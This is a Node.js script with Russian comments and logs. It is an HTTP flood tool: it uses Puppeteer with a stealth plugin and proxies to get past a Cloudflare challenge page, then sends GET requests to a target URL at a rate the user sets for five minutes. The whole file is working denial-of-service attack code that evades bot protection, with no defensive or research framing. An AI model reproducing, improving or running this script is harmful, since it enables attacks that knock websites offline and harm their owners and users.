const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const fs = require('fs');
const { Worker, isMainThread, workerData } = require('worker_threads');

puppeteer.use(StealthPlugin());

// Конфигурация
const config = {
    chromePath: '/usr/bin/google-chrome',
    userAgents: [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ],
    timeout: 30000
};

async function runWorker({ targetUrl, proxy, rate }) {
    console.log(`[+] Инициализация worker для ${targetUrl}`);
    
    let browser;
    try {
        const launchOptions = {
            headless: 'new', // Новый headless-режим
            args: [
                `--proxy-server=${proxy}`,
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--ignore-certificate-errors',
                '--disable-gpu',
                '--disable-software-rasterizer',
                '--disable-xss-auditor'
            ],
            ignoreHTTPSErrors: true,
            executablePath: config.chromePath
        };

        console.log('[→] Запуск браузера...');
        browser = await puppeteer.launch(launchOptions);
        const page = await browser.newPage();

        // Настройка User-Agent
        const userAgent = config.userAgents[0];
        await page.setUserAgent(userAgent);
        await page.setJavaScriptEnabled(true);

        console.log(`[→] Переход на ${targetUrl}`);
        await page.goto(targetUrl, {
            waitUntil: 'networkidle2',
            timeout: config.timeout
        });

        // Проверка Cloudflare
        const title = await page.title();
        console.log(`[i] Заголовок страницы: "${title}"`);
        
        if (title.includes('Just a moment')) {
            console.log('[!] Обнаружен Cloudflare Challenge');
            await solveChallenge(page);
        }

        console.log('[✓] Подключение установлено');
        startFlood(targetUrl, proxy, rate, userAgent);

    } catch (error) {
        console.error(`[×] Критическая ошибка: ${error.message}`);
        if (browser) await browser.close();
        process.exit(1);
    }
}

async function solveChallenge(page) {
    try {
        console.log('[→] Решение challenge...');
        await page.waitForSelector('#challenge-form', { timeout: 10000 });
        await page.waitForTimeout(3000);
        await page.click('#challenge-form input[type="submit"]');
        await page.waitForNavigation({ timeout: 15000 });
        console.log('[✓] Challenge решен');
    } catch (error) {
        console.error('[×] Не удалось решить challenge:', error.message);
        throw error;
    }
}

function startFlood(targetUrl, proxy, rate, userAgent) {
    const [host, port] = proxy.split(':');
    console.log(`[⚡] Запуск флуда (${rate} запр/сек)`);

    const interval = setInterval(() => {
        axios.get(targetUrl, {
            proxy: { host, port: parseInt(port) },
            headers: { 'User-Agent': userAgent },
            timeout: 3000
        })
        .then(() => process.stdout.write('.'))
        .catch(() => process.stdout.write('x'));
    }, 1000 / rate);

    setTimeout(() => {
        clearInterval(interval);
        console.log('\n[!] Флуд завершен');
    }, 300000);
}

if (isMainThread) {
    const targetUrl = process.argv[2];
    const threads = parseInt(process.argv[3]);
    const proxyFile = process.argv[4];
    const rate = parseInt(process.argv[5]);

    const proxies = fs.readFileSync(proxyFile, 'utf-8')
        .split('\n')
        .filter(p => p.trim().length > 0);

    console.log(`[•] Запуск ${threads} потоков`);
    new Worker(__filename, { workerData: {
        targetUrl,
        proxy: proxies[0],
        rate
    }});
} else {
    runWorker(workerData);
}
